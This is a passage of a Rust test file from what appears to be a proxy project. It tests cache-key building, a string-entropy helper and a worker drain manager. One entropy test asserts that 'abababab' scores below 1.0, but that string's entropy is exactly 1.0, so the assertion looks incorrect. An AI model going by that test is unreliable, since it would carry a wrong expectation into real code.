        let key2 = build_cache_key("GET", "https", "admin.example.com", "/users");

        assert_ne!(key1, key2);
    }

    #[test]
    fn test_cache_key_different_paths() {
        let key1 = build_cache_key("GET", "https", "example.com", "/api/v1/users");
        let key2 = build_cache_key("GET", "https", "example.com", "/api/v2/users");

        assert_ne!(key1, key2);
    }

    #[test]
    fn test_cache_key_query_string_matters() {
        let key1 = build_cache_key("GET", "https", "example.com", "/search?q=test");
        let key2 = build_cache_key("GET", "https", "example.com", "/search?q=other");

        assert_ne!(key1, key2);
    }

    #[test]
    fn test_cache_key_with_port() {
        let key = build_cache_key("GET", "https", "example.com:8080", "/api");
        assert!(key.contains(":8080"));
    }

    #[test]
    fn test_cache_key_scheme_difference() {
        let http_key = build_cache_key("GET", "http", "example.com", "/api");
        let https_key = build_cache_key("GET", "https", "example.com", "/api");

        assert_ne!(http_key, https_key);
    }

    #[test]
    fn test_cache_key_consistency() {
        let key1 = build_cache_key("GET", "https", "example.com", "/api/users");
        let key2 = build_cache_key("GET", "https", "example.com", "/api/users");

        assert_eq!(key1, key2);
    }

    #[test]
    fn test_cache_key_with_complex_uri() {
        let key = build_cache_key(
            "POST",
            "https",
            "api.example.com",
            "/api/v1/users?page=1&limit=100&sort=name",
        );

        assert!(key.contains("/api/v1/users"));
        assert!(key.contains("page=1"));
    }

    #[test]
    fn test_cache_key_case_sensitive_host() {
        let key1 = build_cache_key("GET", "https", "Example.com", "/api");
        let key2 = build_cache_key("GET", "https", "example.com", "/api");

        assert_ne!(key1, key2);
    }
}

#[cfg(test)]
mod entropy_calculation_tests {
    use std::collections::HashMap;

    fn calculate_entropy(s: &str) -> f32 {
        if s.is_empty() {
            return 0.0;
        }

        let mut char_counts: HashMap<char, usize> = HashMap::new();
        for c in s.chars() {
            *char_counts.entry(c).or_insert(0) += 1;
        }

        let len = s.len() as f32;
        let entropy: f32 = char_counts
            .values()
            .map(|&count| {
                let p = count as f32 / len;
                -p * p.log2()
            })
            .sum();

        entropy
    }

    #[test]
    fn test_entropy_single_character() {
        let result = calculate_entropy("aaaaaaa");
        assert!((result - 0.0).abs() < 0.001);
    }

    #[test]
    fn test_entropy_two_characters() {
        let result = calculate_entropy("abababab");
        assert!(result > 0.0);
        assert!(result < 1.0);
    }

    #[test]
    fn test_entropy_uniform_distribution() {
        let chars: String = (0..100)
            .map(|i| (i % 26 + b'a') as char as u8 as char)
            .collect();
        let result = calculate_entropy(&chars);
        assert!(result > 4.0);
    }

    #[test]
    fn test_entropy_empty_string() {
        let result = calculate_entropy("");
        assert_eq!(result, 0.0);
    }

    #[test]
    fn test_entropy_url_high_entropy() {
        let url = "/api/users/123/profile?token=abc123xyz&sig=AAAAAAA";
        let result = calculate_entropy(url);
        assert!(result > 3.0);
    }

    #[test]
    fn test_entropy_path_low_entropy() {
        let path = "/api/users/users/users/users/users";
        let result = calculate_entropy(path);
        assert!(result < 3.0);
    }

    #[test]
    fn test_entropy_base64_high_entropy() {
        let encoded =
            "dHJ1c3RlZF9jbGllbnRfaWQ9MTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODk=";
        let result = calculate_entropy(encoded);
        assert!(result > 4.0);
    }

    #[test]
    fn test_entropy_normal_text() {
        let text = "The quick brown fox jumps over the lazy dog";
        let result = calculate_entropy(text);
        assert!(result > 3.0 && result < 4.5);
    }

    #[test]
    fn test_entropy_repeated_pattern() {
        let pattern = "ABABABABABABABABABABABABABABABAB";
        let result = calculate_entropy(pattern);
        assert!(result < 2.0);
    }
}

#[cfg(test)]
mod overseer_lifecycle_tests {
    use parking_lot::RwLock;
    use std::sync::Arc;
    use synvoid::overseer::drain_manager::DrainManager;
    use synvoid::process::WorkerId;

    #[test]
    fn test_drain_manager_start_drain() {
        let manager = DrainManager::new(100);

        let drain_id = manager.start_drain(30);
        assert!(drain_id > 0);
        assert_eq!(manager.get_drain_status().drain_id, drain_id);
    }

    #[test]
    fn test_drain_manager_register_worker() {
        let manager = DrainManager::new(100);

        manager.start_drain(30);
        manager.register_worker(WorkerId(1), 10, 5);

        let status = manager.get_drain_status();
        assert_eq!(status.active_connections, 10);
        assert_eq!(status.idle_connections, 5);
    }

    #[test]
    fn test_drain_manager_multiple_workers() {
        let manager = DrainManager::new(100);

        manager.start_drain(60);
        manager.register_worker(WorkerId(1), 20, 10);
        manager.register_worker(WorkerId(2), 15, 8);
        manager.register_worker(WorkerId(3), 10, 5);

        let total = manager.total_active_connections();
        assert_eq!(total, 45);
    }

    #[test]
    fn test_drain_manager_update_connections() {
        let manager = DrainManager::new(100);

        manager.start_drain(30);
        manager.register_worker(WorkerId(1), 10, 5);

        manager.update_worker_connections(&WorkerId(1), 5, 5);

        let total = manager.total_active_connections();
        assert_eq!(total, 5);
    }

    #[test]
    fn test_drain_manager_mark_stopped_accepting() {
        let manager = DrainManager::new(100);

        manager.start_drain(30);
        manager.register_worker(WorkerId(1), 0, 10);

        manager.mark_worker_stopped_accepting(&WorkerId(1));

        assert!(manager.all_workers_drained());
    }

    #[test]
    fn test_drain_manager_mark_drain_complete() {
        let manager = DrainManager::new(100);

        manager.start_drain(30);
        manager.register_worker(WorkerId(1), 0, 0);

        manager.mark_worker_drain_complete(&WorkerId(1), 100);

        let status = manager.get_drain_status();
        assert!(status.drain_complete);
    }

    #[test]
    fn test_drain_manager_clear() {
        let manager = DrainManager::new(100);

        manager.start_drain(30);
        manager.register_worker(WorkerId(1), 10, 5);

        manager.clear();

        assert!(!manager.get_drain_status().is_draining);
        assert_eq!(manager.total_active_connections(), 0);
    }

    #[test]
    fn test_drain_manager_worker_status() {
        let manager = DrainManager::new(100);

        manager.start_drain(30);
        manager.register_worker(WorkerId(1), 10, 5);

        let status = manager.get_worker_status(&WorkerId(1));
        assert!(status.is_some());
        let worker_status = status.unwrap();
        assert_eq!(worker_status.active_connections, 10);
        assert_eq!(worker_status.idle_connections, 5);
    }

    #[test]
    fn test_drain_manager_not_all_drained_initially() {
        let manager = DrainManager::new(100);

        manager.start_drain(30);
        manager.register_worker(WorkerId(1), 10, 5);
        manager.register_worker(WorkerId(2), 5, 3);

        assert!(!manager.all_workers_drained());
    }

    #[test]
    fn test_drain_manager_all_drained_when_complete() {
        let manager = DrainManager::new(100);

        manager.start_drain(30);
        manager.register_worker(WorkerId(1), 0, 0);
        manager.register_worker(WorkerId(2), 0, 0);

        manager.mark_worker_stopped_accepting(&WorkerId(1));
        manager.mark_worker_stopped_accepting(&WorkerId(2));

        assert!(manager.all_workers_drained());
    }
}
